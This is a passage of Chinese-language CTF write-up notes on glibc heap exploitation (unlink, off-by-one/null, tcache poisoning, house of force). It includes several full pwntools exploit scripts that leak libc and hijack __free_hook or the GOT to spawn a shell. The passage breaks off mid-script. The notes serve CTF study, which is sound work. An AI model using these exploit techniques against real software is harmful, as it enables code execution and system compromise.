+libc = ELF(&#39;./libc6-i386_2.31-0ubuntu9.14_amd64.so&#39;)
+#p = remote(&#39;)
+
+def debug():
+    gdb.attach(p)
+    #gdb.attach(p,&#39;b *0x\nc&#39;)
+sd = lambda s : p.send(s)
+sl = lambda s : p.sendline(s)
+sa = lambda n,s : p.sendafter(n,s)
+sla = lambda n,s : p.sendlineafter(n,s)
+rc = lambda n : p.recv(n)
+rl = lambda : p.recvline()
+ru = lambda s : p.recvuntil(s)
+ra = lambda : p.recvall()
+it = lambda : p.interactive()
+uu32 = lambda data : u32(data.ljust(4, b&#39;\x00&#39;))
+uu64 = lambda data : u64(data.ljust(8, b&#39;\x00&#39;))
+def choice(idx):
+    sla(&quot;What&#39;s your choice :&quot;,str(idx))
+
+def add(size,content):
+    choice(1)   
+    sa(&#39;Note size :&#39;,str(size))
+    sa(&#39;Content :&#39;,content)
+   
+def delete(idx):
+    choice(2)
+    sa(&#39;Index :&#39;,str(idx))
+    #print(&quot;删掉chunk%d&quot; % idx)
+    
+def show(idx):
+    choice(3)
+    sa(&#39;Index :&#39;,str(idx))
+def exit():
+    choice(4)
+    
+#首先利用unsortbin泄露libc
+add(0x500,b&#39;a&#39;)
+add(0x28,b&#39;a&#39;) #原因避免下一步free后堆和top chunk合并导致在unsortedbin中找不到堆块
+delete(0)
+add(0x500,b&#39;a&#39;) #一定要申请回来，保证下一步打印的时候fd指针存放的是打印函数的地址，如果在tcach中fd就是0了。
+show(0)
+
+base=u32(rc(4))-0x39-libc.sym[&#39;__malloc_hook&#39;]
+print(&quot;base:&quot;+hex(base))
+sys=base+libc.sym[&#39;system&#39;]
+print(&#39;system:&#39;+hex(sys))
+
+delete(0)
+delete(1)
+add(0x8,p32(sys)+b&#39;||sh&#39;) #下标为1的a堆存放下标为0的a堆为内容堆
+#add(0x8, p32(sys) + b&#39;||sh&#39;) #在执行show函数时，调用前4个字节，也就是system，参数是note
+#，也就是’217464f17c7c7368’，其中7c7c7368是’||sh’，由于system函数的特性，会执行前面的217464f1，执行失败后，发现后面有’||&#39;，于是继续执行sh，相当于执行了system(‘sh’)，成功获取shell权限
+# debug()
+show(0)
+it()
+</code></pre>
+<h1>off by one /null &amp; chunk overlap</h1><h2 id="section-22">chunk overlap  向后合并</h2><p><strong>向后合并（向低地址合并）</strong></p>
+<p>free时先检查当前堆块的prev_inuse位是否为0,0则认为上一个堆块已经被free（在tcache中的堆块不认为被free），再根据pre_size大小+当前堆size与上一个堆块合并为1个堆块。</p>
+<p>如图释放浅蓝色堆块，会合并上2个堆块</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20241027200029012.png" alt="image-20241027200029012"></p>
+<p>合并后</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20241027200248773.png" alt="image-20241027200248773"></p>
+<h2 id="section-23">unlink机制</h2><p>利用条件：</p>
+<p>1.知道存储堆指针的数组的地址（通过泄露pie得到）</p>
+<p>2.off by null/one</p>
+<p><a href="https://xz.aliyun.com/t/13165?time__1311=mqmxnDBDcD2Du0iD%2FD0YOGk%2BQIx7w5cD%2BhD&alichlgref=https%3A%2F%2Fwww.google.com.hk%2F">PWN - House of einherjar (unlink) x off by one (null) - 先知社区 (aliyun.com)</a></p>
+<p>off by null 是 off by one 的一种更特殊的形式，只溢出的单个的 <code>null</code> 字节，即 &#39;\x00&#39; 。由于 <code>prev_inuse</code> 位的特殊性，off by null 常用于在堆溢出题中构造 <code>unlink</code> 进行攻击</p>
+<p>Unlink</p>
+<p>假设正常情况下，每申请一个 chunk 会保存一个指向该 chunk 内存块的指针。
+<img src="/__published_media/external/%E5%9B%BE%E5%BA%93/dfb7511bb2135bdc39c96ac5aa068046_MD5.png" alt="">
+在 chunk1 伪造 fake chunk ，需要注意：</p>
+<ol>
+<li><p>为了绕过</p>
+<pre><code class="language-c">if(__builtin_expect(FD-&gt;bk !=c P || BK-&gt;fd != P, 0))        
+  malloc_printerr(check_action, &quot;corrupted double-linked list&quot;, P, AV);
+</code></pre>
+<p>就是检查fake_chunk的FD对应堆的bk是否指向自己，BK对应堆fd是否指向自己。<img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240725121351942.png" alt="image-20240725121351942"></p>
+<p>令：</p>
+<ul>
+<li><code>fakeFD -&gt; bk == P1</code> &lt;=&gt; <code>*(&amp;fakeFD + 0x18) == P1</code> &lt;=&gt; <code>*fakeFD == &amp;P1 - 0x18</code></li>
+<li><code>fakeBK -&gt; fd == P1</code> &lt;=&gt; <code>*(&amp;fakeBK + 0x10) == P1</code> &lt;=&gt; <code>*fakeBK == &amp;P1 - 0x10</code></li>
+</ul>
+</li>
+<li><p>为了绕过</p>
+<pre><code class="language-c">if(__builtin_expect(chunksize(P) != prev_size(next_chunk(P)), 0)) 
+  malloc_printerr(``&quot;corrupted size vs. prev_size&quot;);
+</code></pre>
+<p>检查与被释放chunk相邻高地址的chunk的prevsize的值是否擦头flag等于被释放chunk的size大小</p>
+<p>1要将 chunk2 (见下图）的 prev_size 修改成 fake chunk 的 size。</p>
+<p>2或者将 <code>size</code> 和 <code>prev_size</code> 修改为 0,因为找相邻chunk是fake_chunk基地址+size,如果size=0那么pre_size仍定位到基地址=0。不过 glicbc-2.29 起多了对 <code>size</code> 和 <code>prev_size</code> 的检查。</p>
+<pre><code class="language-c">/* consolidate backward */
+if(!prev_inuse(p)) {
+ prevsize = prev_size (p);
+ size += prevsize;
+ p = chunk_at_offset(p, -((``long``) prevsize));
+ if(__glibc_unlikely (chunksize(p) != prevsize))
+ malloc_printerr (``&quot;corrupted size vs. prev_size while consolidating&quot;);
+ unlink_chunk (av, p);
+}
+</code></pre>
+</li>
+<li><p>为了绕过</p>
+<pre><code class="language-c">if(!in_smallbin_range(chunksize_nomask(P)) &amp;&amp;                
+  ``__builtin_expect(P-&gt;fd_nextsize != NULL, 0)) {              
+  ``if` `(__builtin_expect(P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) ||       
+    ``__builtin_expect(P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))        
+    ``malloc_printerr(check_action, ``&quot;corrupted double-linked list (not small)&quot;``, P, AV);
+</code></pre>
+<p>若是在large bin会对fd_nextsize和bk_nextsize检查</p>
+<p>fake chunk 大小应在 small bin 范围。</p>
+</li>
+<li><p>为了能使得 chunk2 与 fake chunk 合并，chunk2 的 size 的 PREV_INUSE 位 为 0 ，且 chunk2 的大小不能在 fast bin 范围(不然直接进入fast bin)。</p>
+</li>
+</ol>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/653dfa467d93c3fe91ee1eff5b26b5aa_MD5.png" alt=""></p>
+<p>释放 chunk2 ，向后合并(向低地址合并) fake chunk ，使得 fake chunk 进行 unlink 操c作，<strong>按如下代码执行</strong>，因此 P1 = &amp;P1 - 0x18（&amp;p1代表他在堆指针数组的地址），如下图所指。</p>
+<pre><code class="language-c">BK-&gt;fd = FD &lt;=&gt; P1 = &amp;P1 - 0x18 //最后P1 = &amp;P1 - 0x18
+</code></pre>
+<pre><code class="language-c">FD-&gt;bk = BK &lt;=&gt; P1 = &amp;P1 - 0x10 //首先改为了P1 = &amp;P1 - 0x10 
+</code></pre>
+<ul>
+<li><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/0d9e52c06eae997951fdb1aca70a6299_MD5.png" alt=""></li>
+</ul>
+<p>至此，整个指针数组被控制，可以实现任意地址读写。</p>
+<h2 id="section-24">off by one</h2><h3 id="section-25">介绍</h3><p>​	off-by-one是一种特殊的溢出漏洞，off-by-one指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节(p8写入)。这种漏洞的产生往往与边界验证不严和字符串操作有关</p>
+<h3 id="section-26">例题</h3><h4>源鲁 null</h4><p>题干</p>
+<pre><code class="language-c">unsigned __int64 edit()
+{
+  int v1; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  printf(&quot;Index: &quot;);
+  __isoc99_scanf(&quot;%d&quot;, &amp;v1);
+  if ( v1 &lt;= 31 &amp;&amp; Page[v1] )
+  {
+    printf(&quot;Content: &quot;);
+    vuln(Page[v1], Size[v1]); 
+  }
+  return __readfsqword(0x28u) ^ v2;
+}
+
+
+
+void __fastcall vuln(_BYTE *a1, int a2)
+{
+  int v2; // [rsp+14h] [rbp-Ch]
+
+  if ( a2 &gt; 0 )
+  {
+    v2 = 0;
+    while ( read(0, a1, 1uLL) == 1 ) //存在off one,最后会多读1字节p8()修改
+    { 
+      if ( *a1 == &#39;\n&#39; || (++a1, v2 == a2) ) //v2++在最后
+      {
+        *a1 = 0;
+        return;
+      }
+      ++v2;
+    }py
+  }
+}
+</code></pre>
+<p>exp</p>
+<pre><code class="language-py"># tcache_0x100
+for i in range(7):
+    add_chunk(i, 0x98)  # 0-6
+
+add_chunk(7, 0x98)  # 7
+add_chunk(8, 0x18)  # 8
+add_chunk(9, 0x98)  # 9
+add_chunk(10, 0x98)  # 10
+
+add_chunk(20, 0x18) 
+add_chunk(21, 0x18)
+add_chunk(22, 0x18)
+delete_chunk(20)
+delete_chunk(21)
+delete_chunk(22)
+
+for i in range(7):
+    delete_chunk(6-i)
+delete_chunk(7) #进unsorted bin
+
+edit_chunk(8, b&#39;a&#39; * 0x10 + p64(0xc0) + p8(0xa0))
+delete_chunk(9) #chunk overlap,合并7.8.9堆块
+
+
+add_chunk(11, 0x68)#都是0x70大小因为0x70tcache满了，避免进tcache
+add_chunk(12, 0x68)#12号包括了chunk——8，而8将劫持tcache
+delete_chunk(8) 
+
+show_chunk(12)
+p.recvuntil(b&#39;Content: &#39;)
+libc_base = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) - 0x3afca0 - 0x3c000
+libc.address = libc_base
+success(&quot;libc_base = &quot; + hex(libc_base))
+edit_chunk(12, b&#39;a&#39; * 0x30 + p64(libc.sym[&#39;__free_hook&#39;]) )#完成tcache劫持，0x20大小bin见图
+
+add_chunk(13, 0x18)#8号
+add_chunk(14, 0x18)#free_hook
+
+one_gadget = [0x4f29e, 0x4f2a5, 0x4f302, 0x10a2fc]
+edit_chunk(14, p64(libc.sym[&#39;system&#39;]))
+
+edit_chunk(13, b&#39;/bin/sh\x00&#39;)
+delete_chunk(13)
+
+# gdb.attach(p)
+
+p.interactive()
+</code></pre>
+<p>edit 12后</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20241027201518383.png" alt="image-20241027201518383"></p>
+<h4>xyctf one_byte</h4><p>题干</p>
+<pre><code class="language-c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  int choice; // [rsp+Ch] [rbp-4h]
+
+  init(argc, argv, envp);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      menu();
+      choice = get_choice();
+      if ( choice != 1 )
+        break;
+      add_chunk();
+    }
+    switch ( choice )
+    {
+      case 2:
+        delete_chunk();
+        break;
+      case 3:
+        view_chunk();
+        break;
+      case 4:
+        edit_chunk();
+        break;
+      case 5:
+        puts(&quot;[-] exit()&quot;);
+        exit(0);
+      default:
+        puts(&quot;[-] Error choice!&quot;);
+        break;
+    }
+  }
+</code></pre>
+<p>exp</p>
+<pre><code class="language-py">#1.为填充tcache bln [0xa0]做准备
+add(0,0x98)
+add(1,0x98)
+add(2,0x98)
+add(3,0x98)
+add(4,0x98)
+add(5,0x98)
+add(6,0x98)
+
+# 2.为后续利用off by one漏洞做准备
+add(7,0x18)
+add(8,0x18)
+add(9,0x98)
+add(10,0x18)
+
+# 3.填满tcache btlns [0xa0]
+delete(0)
+delete(1)
+delete(2)
+delete(3)
+delete(4)
+delete(5)
+delete(6)·
+# # 4.通过off by one,制造uaf漏洞，并泄露libc地址
+edit(7,b&#39;a&#39;*0x18+p8(0xc1))
+delete(8)
+add(11,0xb8)
+delete(9)
+
+
+show(11)
+
+to.recv(0x20)
+llbc_base = u64(to.recv(6).ljust(8,b&#39;\x00&#39;)) - 0x1ECBE0 #是__malloc_hook+0x16
+print(&#39;libc_base:&#39; + hex(llbc_base))
+system_addr = llbc_base + libc.sym[&#39;system&#39;]
+free_hook = llbc_base + libc.sym[&#39;__free_hook&#39;]
+
+#5.恢复原本chunk的大小
+edit(7,b&#39;a&#39;*0x18+p8(0x21))
+#6.将多余的chunk申请掉，为后续改写chunk的fd指针做准备
+add(12,0x18)
+add(13,0x78)
+#7.制造tcachebin的uaf
+add(14,0x18)
+add(15,0x68)
+add(16,0x68)
+add(17,0x68)
+edit(14,b&#39;d&#39;*0x18+p8(0xe1))
+delete(15) #原本15的chunk
+add(18,0xd8)
+#8.之所以把17也free，原因是需要改变tcachabin index的值
+#改掉chunk 16 的fd指针，指向_free_hook
+delete(17)
+delete(16)
+edit(18,b&#39;a&#39;*0x68+p64(0x71)+p64(free_hook))
+#9.两次申请chunk，申请到_free_hook空间
+add(19,0x68) #原本chunk16，
+add(20,0x68) #_free_hook的空间
+edit(19,b&#39;/bin/sh;&#39;)
+edit(20,p64(system_addr)) #填入system地址
+delete(19) #触发_free_hook调用，调用system(’/bin/sh’)
+
+to.interactive()
+</code></pre>
+<h4>axb_2019_heap</h4><p><a href="https://blog.csdn.net/qq_43935969/article/details/116140863?ops_request_misc=%7B%22request%5Fid%22%3A%22172256191216800225555360%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=172256191216800225555360&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-116140863-null-null.142%5Ev100%5Epc_search_result_base7&utm_term=axb_2019_heap&spm=1018.2226.3001.4187">axb_2019_heap详解_axb 2019 heap-CSDN博客</a></p>
+<p>2.23，unlink，无uaf，无show</p>
+<ol>
+<li><p>add：根据idx创建size（大于0x80）大小的内容为content的块</p>
+<p>块指针和块大小存放在一个<a href="https://so.csdn.net/so/search?q=%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F&spm=1001.2101.3001.7020">全局变量</a>note中</p>
+</li>
+<li><p>edit：存在off by one</p>
+<p>get_input(*((_QWORD *)&amp;note + 2 * v1), *((_DWORD *)&amp;note + 4 * v1 + 2));</p>
+<p>if ( a2 + 1 &lt;= (unsigned int)v3 )v3是以及输入的长度，a2是给定的长度，存在一个字节的溢出</p>
+</li>
+</ol>
+<p>exp</p>
+<pre><code class="language-py">ru(&#39;Enter your name: &#39;) 
+sl(b&#39;%15$p%19$p&#39;)
+ru(&#39;Hello, &#39;)
+base=int(rc(14),16)-240-libc.sym[&#39;__libc_start_main&#39;]
+pie=int(rc(14),16)-0x116a
+free_hook = base + libc.sym[&#39;__free_hook&#39;]
+
+note=pie+0x202060 #堆指针地址
+fd=note-0x18
+bk=note-0x10
+print(&#39;base:&#39;,hex(base))
+print(&#39;pie:&#39;,hex(pie))
+print(&#39;note:&#39;,hex(note))
+
+add(0,0x98,&#39;aaa&#39;) #大小为0x98而不是0x90是为了可以改pre_size并且off by one
+add(1,0x98,&#39;bbb&#39;)
+add(2,0x88,&#39;ccc&#39;)
+pa=p64(0)+p64(0x90)+p64(fd)+p64(bk)+b&#39;a&#39;*0x70+p64(0x90)+p8(0xa0)#注意是p8
+edit(0,pa)
+delete(1)
+
+pa = p64(0) * 3
+pa += p64(free_hook) + p64(0x98)
+#pa += p64(e.got[&#39;atoi&#39;]+pie)+p64(0x98) 本来想改atoi的，但保护全开无法修改got表
+pa += p64(note + 24) +b&quot;/bin/sh\x00&quot;
+edit(0,pa)
+
+sys=base+libc.sym[&#39;system&#39;]
+edit(0,p64(sys))
+delete(1)
+it()
+</code></pre>
+<h2 id="section-27">off by null</h2><p><a href="https://xz.aliyun.com/t/13165?time__1311=mqmxnDBDcD2Du0iD%2FD0YOGk%2BQIx7w5cD%2BhD&alichlgref=https%3A%2F%2Fwww.google.com.hk%2F">PWN - House of einherjar (unlink) x off by one (null) - 先知社区 (aliyun.com)</a></p>
+<p><a href="https://www.jianshu.com/p/056c9db22d81">https://www.jianshu.com/p/056c9db22d81</a></p>
+<h3 id="section-28">介绍</h3><p>​	off by null 是 off by one 的一种更特殊的形式，只溢出的单个的 <code>null</code> 字节，即 &#39;\x00&#39; 。由于 <code>prev_inuse</code> 位的特殊性，off by null 常用于在堆溢出题中构造 <code>unlink</code> 向后合并进行攻击</p>
+<h3 id="section-29">攻击思路</h3><p>​	2.27版本，先通过模板构造一个向后合并的unsoreted bin大堆块泄露libc地址（unsorted bin的fd和bk是栈上确定了偏移的地址，这个地址存放了Top chunk 的地址），再故技重施把free_hook地址写入tcache，打hook攻击。此模板见hgane2025 signin</p>
+<h3 id="section-30">例题</h3><h4>hgame2025 Signin2Heap</h4><p>版本2.27，存在off_null,无uaf，show功能用的puts，见\x00截止，无edit，向后合并</p>
+<pre><code class="language-c">unsigned __int64 add()
+{
+  unsigned int v0; // ebx
+  unsigned int idx; // [rsp+Ch] [rbp-24h] BYREF
+  unsigned int size; // [rsp+10h] [rbp-20h] BYREF
+  unsigned int size_4; // [rsp+14h] [rbp-1Ch]
+  unsigned __int64 v5; // [rsp+18h] [rbp-18h]
+
+  v5 = __readfsqword(0x28u);
+  printf(&quot;Index: &quot;);
+  __isoc99_scanf(&quot;%u&quot;, &amp;idx);
+  if ( idx &gt; 15 )
+  {
+    puts(&quot;There are only 16 pages.&quot;);
+  }
+  else if ( *(&amp;books + idx) )
+  {
+    puts(&quot;The note already exists.&quot;);
+  }
+  else
+  {
+    while ( 1 )
+    {
+      printf(&quot;Size: &quot;);
+      __isoc99_scanf(&quot;%u&quot;, &amp;size);
+      if ( size &lt;= 0xFF )
+        break;
+      puts(&quot;Too big!&quot;);
+    }
+    v0 = idx;
+    *(&amp;books + v0) = malloc(size);
+    printf(&quot;Content: &quot;);
+    size_4 = read(0, *(&amp;books + idx), size);
+    *(*(&amp;books + idx) + size_4) = 0;            // 存在off_by_null会向堆块写入后的内容加一个\0
+  }
+  return __readfsqword(0x28u) ^ v5;
+}
+</code></pre>
+<p>exp</p>
+<pre><code class="language-py">#1泄露libc
+for i in range(7):
+    add(i,0xf8,b&#39;a&#39;)#0-6,先准备填满tcache
+add(7,0xf8,b&#39;a&#39;) #7号堆块是为了进unsorted bin
+add(8,0x68,b&#39;a&#39;) #8号堆块为了off_null改9号堆块的pres_insues位
+add(9,0xf8,b&#39;a&#39;) #释放完成向后合并
+add(10,0x68,b&#39;a&#39;)#10号堆块是为了防止9号堆块释放和top_chunk合并
+
+for i in range(7):#填满tcache
+    delete(i)
+delete(7)#直接进unsortedbin，本应直接泄露libc但本题delete时堆指针置0，无法直接show
+delete(8)
+add(8,0x68,b&#39;a&#39;*0x60+p64(0x100+0x70))#改9号堆块的size位：
+delete(9) #完成向后合并，9号和8，7号堆合并为0x270大小的unsortedbin中堆块
+
+for i in range(7): #接下来就是leak libc
+    add(i,0xf8,&quot;/bin/sh\x00&quot;) #内容随便写
+add(7,0xf8,&quot;cccccccc&quot;)
+
+show(8) #此时8号是unsorted bin开头地址
+base=u64(rc(6).ljust(8,b&#39;\x00&#39;))-0x3EBCA0
+print(&#39;base is: &#39;+hex(base))
+system=base+libc.sym[&#39;system&#39;]
+free_hook = base + libc.sym[&quot;__free_hook&quot;]
+
+# 回收unsortedbin，准备故技重施打hook攻击
+add(11,0x68,b&#39;b&#39;)#原来的8号
+add(9,0xf8,b&#39;c&#39;) #是原来的9号
+
+#重复第一次向后合并
+for i in range(7):
+    delete(i)
+delete(7)
+delete(11)#原来的8号
+add(11,0x68,b&#39;a&#39;*0x60+p64(0x170))
+delete(9) #7，8，9再次合并
+
+add(7,0x68,b&#39;a&#39;)#切割的是unsoreted bin，所以这里不能是0xf8,不然就从tcache分配
+delete(11)  #这部分进tcache 0x70，用来改fd为free_hook
+add(12,0x98,b&#39;c&#39;*0x80+p64(0x100)+p64(0x70)+p64(free_hook))
+add(13,0x68,b&#39;/bin/sh\x00&#39;)
+add(14,0x68,p64(system)) #free hook
+delete(13)
+
+it()
+</code></pre>
+<h4>buu note2</h4><p><a href="https://blog.csdn.net/weixin_38419913/article/details/103333195">2016 ZCTF note2 题解_2016 zctf note2露-CSDN博客</a></p>
+<p>版本2.23，只运许申请4堆块，无uaf，patial relor可改got表</p>
+<p>exp</p>
+<pre><code class="language-py">def add(size, content):
+    p.recvuntil(&quot;&gt;&gt;&quot;)
+    p.sendline(&quot;1&quot;)
+    p.recvuntil(&quot;)&quot;)
+    p.sendline(str(size))
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(content)
+
+def show(index):
+    p.recvuntil(&quot;&gt;&gt;&quot;)
+    p.sendline(&quot;2&quot;)
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(str(index))
+
+def edit(index, choice, content):
+    p.recvuntil(&quot;&gt;&gt;&quot;)
+    p.sendline(&quot;3&quot;)
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(str(index))
+    p.recvuntil(&quot;]&quot;)
+    p.sendline(str(choice))
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(content)
+
+def delete(index):
+    p.recvuntil(&quot;&gt;&gt;&quot;)
+    p.sendline(&quot;4&quot;)
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(str(index))
+
+p.recvuntil(&quot;:&quot;)
+p.sendline(&quot;aaa&quot;) #name
+p.recvuntil(&quot;:&quot;)
+p.sendline(&quot;ddd&quot;)
+
+ptr_0 = 0x602120 #堆地址数组
+fake_fd = ptr_0 - 0x18
+fake_bk = ptr_0 - 0x10
+pa = b&quot;\x00&quot; * 8 + p64(0xa1) + p64(fake_fd) + p64(fake_bk) #0xa1为了过size位检查
+add(0x80,pa)
+add(0x0,&#39;b&#39;) #malloca(0)时glibc默认分配size的大小0x21
+add(0x80,&#39;c&#39;)
+
+delete(1)
+pa=b&quot;\x00&quot; * 16 + p64(0xa0) + p64(0x90)
+add(0,pa) #堆溢出修改chunk2
+delete(2) #进topchuk,同时触发unlink
+
+# 泄漏libc
+free_got = e.got[&quot;free&quot;]
+payload = 0x18 * b&quot;a&quot; + p64(free_got)
+edit(0, 1, payload)
+
+show(0)
+ru(&quot;is &quot;)
+free_addr = uu64(p.recv(6))
+libc_addr = free_addr - libc.symbols[&quot;free&quot;]
+print(&quot;libc address: &quot; + hex(libc_addr))
+
+#get shell
+one_gadget = libc_addr + 0xf02a4
+# debug()
+edit(0, 1, p64(one_gadget)) #overwrite free got -&gt; system address
+
+it()
+</code></pre>
+<h1>house of force</h1><h2 id="section-31">介绍：</h2><p>house of force是针对top chunk的一种手法，通过这种攻击手法，可以将top chunk更新到任意内存，再次申请堆块并写入数据，这就相当于任意地址任意写了。</p>
+<h2 id="section-32">原理：</h2><p>在<strong>2.23和2.27</strong>的libc版本中，由于<strong>没有对top chunk的size合法性进行检查</strong>，因此如果我们能够<strong>控制top chunk的size位</strong>以及<strong>malloc在申请堆块时的大小不受限制</strong>，那么就可以完成该攻击。</p>
+<p>先从malloc函数源码看起，如果malloc函数执行时发现没有任何的bins中的堆块能够满足需求，就会从top chunk中切下一块内存返回给malloc**(前提是top chunk能够有这么多内存供切割)**</p>
+<pre><code class="language-c">      victim = av-&gt;top;//获取当前top chunk的地址
+      size = chunksize (victim);//计算top chunk的大小
+
+      if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))
+      //MINSIZE就是堆块的最小size，32位程序为0x10，64位程序为0x20
+      //如果top chunk的大小大于nb(程序执行malloc需要分配的内存大小)
+      //加上MINSIZE的大小，就从top chunk中来切一块内存
+      //之所以要加上MINSIZE是要保证切割后剩余的内存要是一个完整的堆块
+        {
+          remainder_size = size - nb;//remainder_size为切割后的剩余大小
+          remainder = chunk_at_offset (victim, nb);//remainder为切割前top chunk+nb的值，也就是切割后top chunk的地址
+          av-&gt;top = remainder;//更新top chunk
+          //下面两个set_head给切割出去的堆块以及切割后的top chunk设置新的size
+          set_head (victim, nb | PREV_INUSE |
+                    (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
+          set_head (remainder, remainder_size | PREV_INUSE);
+
+          check_malloced_chunk (av, victim, nb);//调试用的，这里没用
+          void *p = chunk2mem (victim);//返回用户指针
+          alloc_perturb (p, bytes);
+          return p;
+        }
+</code></pre>
+<p>漏洞的利用在这一行代码<code>remainder = chunk_at_offset (victim, nb)</code> 如果我们可以控制nb的值，其实就可以控制remainder的值了(remainder就是切割后的top chunk的地址)，这个手法最终的效果就是精准控制切割后top chunk的地址。</p>
+<h3 id="section-33">探究一下如何控制top_chunk的地址</h3><p>下面我们深入分析一下上面那个式子，来探究一下如何精准控制top chunk的地址。</p>
+<p>首先<code>remainder = chunk_at_offset (victim, nb)</code>等价于下面这个式子</p>
+<pre><code class="language-undefined">victim+nb=top_chunk
+</code></pre>
+<blockquote>
+<p>victim为切割前的top chunk header地址
+nb为实际要申请的内存大小
+top_chunk为切割后的top chunk header的地址</p>
+</blockquote>
+<p>然后将nb和top_chunk再具体展开一下(解释在代码的下面)</p>
+<pre><code class="language-makefile">nb=request_size+0x10
+top_chunk+0x10=target_addr
+</code></pre>
+<blockquote>
+<p>nb 也等于我们malloc时的内存大小(requset_size)，再加上一个0x10的chunk头
+target_addr先假设是篡改top chunk后的地址
+house of force的核心就是篡改top chunk的地址，而我们的数据自然是只能输入到用户区，因此我们需要让top chunk+0x10后才能保证target_addr是位于了篡改后chunk的用户区</p>
+</blockquote>
+<p>将上面两部分整合一下，即为</p>
+<pre><code class="language-undefined">victim+request_size+0x10=target_addr-0x10
+</code></pre>
+<p>最终整理一下为:</p>
+<pre><code class="language-ini">request_size=target_addr-0x20-victim
+</code></pre>
+<p>叙述一下这个式子就是我们 <strong>所申请的内存大小等于想要将top chunk篡改到的地址减去top chunk原本的地址再减去0x20</strong> （32位程序是-0x10，原理一样，只不过原本0x8的内存单元变成了0x4，所以最终的值减半）</p>
+<h3 id="section-34">house of force中对top chunk的size进行的检查</h3><p>此时我们执行malloc(request_size)，就可以将top chunk更新到指定的地址了么?</p>
+<blockquote>
+<p>不可以。别忘了存在一个检查<code>if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))</code>通常来说我们这个request_size是个负数，强转为无符号整数进行判断时，request_size肯定为一个超大的数值，如果top chunk本身的size是正常的话，必然无法满足这个要求，因此house of force的一个条件就是可以控制top chunk的size位(通常都是通过溢出的方式)，将其size设置为-1，-1是转换成无符号整数时，将变成最大的数字0xffffffffffffffff，无论request_size为多大都可以通过if检查了。</p>
+</blockquote>
+<p>将top chunk的size改为0xffffffffffffffff后，再执行malloc(request_size)，即可将top chunk更新到我们指定的地址，然后再次malloc时即可将该内存申请出来，并写入数据。上述内容就是house of force的攻击过程了。</p>
+<h3 id="section-35">house of force手法总结</h3><blockquote>
+<p>适用libc版本:2.23 2.27 2.29</p>
+<p>使用前提:</p>
+<p>1、申请堆块的大小不受限制</p>
+<p>2、能够篡改top chunk的size位(主要是通过溢出的手段)</p>
+<p>3、有top chunk原本的地址(这一条在特殊情况下，可以不具备)</p>
+<p>4、有将top chunk更新后的目的地址(这一条在特殊情况下，可以不具备)</p>
+<p>PS：特殊情况为：我们只需要top chunk的地址更新到堆区，这样我们只需要知道top chunk和目的地址二者的偏移即可。(因为本身其实算request_size的时候要的就是二者偏移)(相关题目可以看hitcontraining_bamboobox)</p>
+<p>攻击效果：可以将top chunk更新到任意已知地址，再将新的堆块从top chunk中申请出来写入数据。就可以达到任意地址任意写的目的。</p>
+<p>防御措施：对top chunk的size位进行检查，判断是否合法</p>
+</blockquote>
+<h2 id="section-36">例题</h2><h3 id="section-37">143</h3><p>Partial RELRO 无pie  2.23版本，存在后门函数，直接输出flag</p>
+<p>题干</p>
+<pre><code class="language-c"> v4 = malloc(0x10uLL);
+ *v4 = hello_message;
+ v4[1] = goodbye_message;
+ (*v4)();
+while ( 1 )
+  {
+    menu();
+    read(0, buf, 8uLL);
+    switch ( atoi(buf) )
+    {
+      case 1:
+        show();
+        break;
+      case 2:
+        add();
+        break;
+      case 3:
+        edit();                                 // 输入时没有检查size的大小，所以可以造成堆溢出
+        break;c
+      case 4:
+        delete();                               // 无uaf
+        break;
+      case 5:
+        v4[1]();                             // 在堆区第一个堆
+        exit(0);
+      default:
+        puts(&quot;Invaild choice!!!&quot;); 			
+        break;
+    }
+  }
+}
+</code></pre>
+<p>利用house of force攻击，改v4【1】的值为后门函数</p>
+<p>一般传统的house of force是通过把top chunck size改成一个很大的数字，常用0xffffffffffffffff。
+当改好top chunck size后，我们就可以申请一个特别的chunck，让chunck覆盖到各种地方。
+如，申请一个很大的chunck，使堆块覆盖到libc中的各种函数的hook部分，完成劫持。也可以申请一个负数，使堆块覆盖到got表的部分，完成got表的改写。</p>
+<p>exp</p>
+<pre><code class="language-python">def cmd(x):
+    io.recvuntil(b&#39;Your choice:&#39;)
+    io.sendline(str(x))
+def add(size,data):
+    cmd(2)
+    io.recvuntil(b&#39;Please enter the length:&#39;)
+    io.sendline(str(size))
+    io.recvuntil(b&#39;Please enter the name:&#39;)
+    io.sendline(data)
+def delete(index):
+    cmd(4)
+    io.recvuntil(b&#39;Please enter the index:&#39;)
+    io.sendline(str(index))
+def show():
+    cmd(1)
+def edit(index,size,data):
+    cmd(3)
+    io.recvuntil(b&#39;Please enter the index:&#39;)
+    io.sendline(str(index))   
+    io.recvuntil(b&#39;Please enter the length of name:&#39;)
+    io.sendline(str(size))
+    io.recvuntil(b&#39;Please enter the new name:&#39;)
+    io.sendline(data)
+add(0x38,b&#39;aaaa&#39;)
+edit(0,0x50,b&#39;a&#39;*(0x38)+p64(0xffffffffffffffff)) #图一
+# debug()
+size=-(0x68)
+
+cmd(2)
+io.recvuntil(b&#39;Please enter the length:&#39;)
